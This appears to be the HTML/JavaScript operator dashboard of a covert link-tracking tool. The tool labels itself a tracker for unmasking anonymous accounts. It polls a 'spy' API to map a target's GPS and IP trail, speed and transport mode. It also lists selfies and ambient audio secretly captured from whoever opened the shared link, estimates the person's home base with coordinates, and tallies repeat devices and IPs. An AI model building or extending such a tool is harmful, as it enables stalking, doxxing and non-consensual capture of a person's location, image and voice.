<!doctype html>
<html lang="ja"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>監視室 {{ link.name }}</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,sans-serif}
.wrap{padding:14px;max-width:1000px;margin:0 auto}
h1{font-size:17px;margin:0 0 10px}
h3{font-size:13px;margin:18px 0 6px;color:#c7cddb}
#map{height:380px;border-radius:12px;overflow:hidden}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin-top:12px}
.card{background:#171a21;border-radius:12px;padding:12px}
.k{font-size:11px;color:#8b93a7}
.v{font-size:19px;font-weight:700;margin-top:2px}
.caps{display:flex;flex-wrap:wrap;gap:8px}
.caps figure{margin:0;background:#171a21;border-radius:10px;padding:6px;width:134px}
.caps img,.caps audio{width:122px;display:block}
.caps figcaption{font-size:10px;color:#8b93a7;margin-top:4px}
table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
td,th{border-bottom:1px solid #232734;padding:4px;text-align:left}
a{color:#4c8dff}
#ipwarn{display:none;margin:10px 0;padding:9px 12px;border-radius:10px;
  background:#2a2113;color:#f0b429;font-size:12px;line-height:1.6}
.nav{display:flex;flex-wrap:wrap;gap:7px;margin:0 0 12px}
.nav a,.nav button{display:inline-block;padding:7px 13px;border-radius:8px;background:#2b3346;
  color:#c7cddb;text-decoration:none;font-size:12px;border:0;cursor:pointer;font-family:inherit}
.nav a.p,.nav button.p{background:#4c8dff;color:#fff}
.nav a.back{background:#3a2b46;color:#e0c7ff}
</style></head><body><div class="wrap">
<h1>監視室 — {{ link.person or link.name }}
  <small style="color:#8b93a7">/{{ code }}</small></h1>

<div class="nav">
  <a class="p" href="/l/{{ code }}" target="_blank">このリンクを開く</a>
  <button id="cp">リンクをコピー</button>
  <a href="/">裏垢トラッカー</a>
  <a href="/tracks">追跡一覧</a>
  <a href="/link/{{ code }}">リンク詳細</a>
  <a href="/track/{{ code }}">軌跡</a>
  <a href="/link/{{ code }}/qr.png" target="_blank">QR</a>
</div>

<div id="map"></div>
<div id="ipwarn"></div>
<div class="grid" id="cards"></div>
<h3>取得物（自撮り・環境音）</h3><div class="caps" id="caps"></div>
<h3>拠点推定</h3><div id="spots"></div>
<h3>リピーター</h3><div id="rep"></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
var CODE = {{ code|tojson }};
var LINK_URL = location.origin + "/l/" + CODE;

(function () {
  var b = document.getElementById("cp");
  if (!b) return;
  function done() {
    b.textContent = "コピーしました";
    setTimeout(function () { b.textContent = "リンクをコピー"; }, 1600);
  }
  function fallback() {
    try {
      var t = document.createElement("textarea");
      t.value = LINK_URL;
      t.style.cssText = "position:fixed;left:-9999px";
      document.body.appendChild(t); t.select();
      document.execCommand("copy"); t.remove(); done();
    } catch (e) {}
  }
  b.addEventListener("click", function () {
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(LINK_URL).then(done).catch(fallback);
      } else fallback();
    } catch (e) { fallback(); }
  });
})();

var map = L.map('map').setView([36.2, 138.2], 5);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
  {maxZoom:19, attribution:'OSM'}).addTo(map);
var layer = L.layerGroup().addTo(map), line = null;
function esc(s){return String(s==null?"":s).replace(/[<>&]/g,function(c){
  return {'<':'&lt;','>':'&gt;','&':'&amp;'}[c];});}
function km(v){return (v>=1000? (v/1000).toFixed(1)+"km" : v+"m");}
function fmt(ms){var s=Math.round((ms||0)/1000);return Math.floor(s/60)+"分"+(s%60)+"秒";}
function load(){
  fetch('/api/spy/'+encodeURIComponent(CODE),{cache:'no-store'})
   .then(function(r){return r.json()}).then(function(d){
    document.getElementById('cards').innerHTML =
      [['移動距離', km(d.moved_m)], ['平均速度', d.avg_kmh+' km/h'],
       ['推定移動手段', d.transport], ['取得点', d.points],
       ['GPS以外の点', d.ip_only], ['滞在合計', fmt(d.dwell_ms)]]
      .map(function(x){return '<div class="card"><div class="k">'+x[0]+
        '</div><div class="v">'+esc(x[1])+'</div></div>'}).join('');
    var w = document.getElementById('ipwarn');
    if (w) {
      if (d.warn) { w.style.display = 'block'; w.textContent = '⚠ ' + d.warn; }
      else { w.style.display = 'none'; }
    }
    document.getElementById('caps').innerHTML = (d.captures||[]).map(function(x){
      var url='/s/'+encodeURIComponent(CODE)+'/cap/'+x.id;
      var body = x.kind==='voice'
        ? '<audio controls src="'+url+'"></audio>'
        : '<img src="'+url+'">';
      return '<figure>'+body+'<figcaption>'+esc(x.kind)+' '+
        esc((x.ts||'').slice(5,19))+'</figcaption></figure>';
    }).join('') || '<div class="k">まだなし</div>';
    document.getElementById('spots').innerHTML =
      '<table><tr><th>推定</th><th>都市</th><th>点</th><th>基準</th><th>最終</th><th>座標</th></tr>' +
      ((d.spots||[]).map(function(s){
        return '<tr><td>'+esc(s.label)+'</td><td>'+esc(s.city)+'</td><td>'+s.n+
        '</td><td>'+esc(s.acc)+'</td><td>'+esc((s.last||'').slice(5,16))+'</td><td>'+
        s.lat.toFixed(4)+','+s.lon.toFixed(4)+'</td></tr>';}).join('') ||
        '<tr><td colspan="6" class="k">点が増えると出ます</td></tr>') + '</table>';
    document.getElementById('rep').innerHTML =
      '<table><tr><th>端末/IP</th><th>回数</th><th>端末</th><th>最終</th></tr>' +
      ((d.repeaters||[]).map(function(r){
        return '<tr><td>'+esc(r.k)+'</td><td>'+r.n+'</td><td>'+esc(r.device)+
        '</td><td>'+esc((r.last||'').slice(5,16))+'</td></tr>';}).join('') ||
        '<tr><td colspan="4" class="k">まだなし</td></tr>') + '</table>';
  }).catch(function(){});
  fetch('/api/track/'+encodeURIComponent(CODE),{cache:'no-store'})
   .then(function(r){return r.json()}).then(function(t){
    var pts = (t.points||[]).filter(function(p){return p.lat!=null});
    layer.clearLayers();
    var ll = pts.map(function(p){return [p.lat,p.lon]});
    if (line) { map.removeLayer(line); line = null; }
    if (ll.length>1){ line = L.polyline(ll,{color:'#4c8dff'}).addTo(map);
      map.fitBounds(line.getBounds(),{padding:[24,24]}); }
    else if (ll.length===1){ map.setView(ll[0],16); }
    pts.forEach(function(p){
      L.circleMarker([p.lat,p.lon],{radius:3,color:p.src==='ip'?'#f0b429':'#4c8dff'})
       .addTo(layer);
    });
    if (t.last && t.last.lat!=null){
      L.marker([t.last.lat,t.last.lon]).addTo(layer)
       .bindPopup(esc(t.last.city||'')+'<br>'+esc((t.last.ts||'').slice(0,19))+
                  '<br>'+(t.last.src==='ip'?'IP推定':'GPS'));
    }
    var w = document.getElementById('ipwarn');
    if (w && t.warn && w.style.display==='none') {
      w.style.display='block'; w.textContent='⚠ '+t.warn;
    }
  }).catch(function(){});
}
load(); setInterval(load, 10000);
</script></div></body></html>
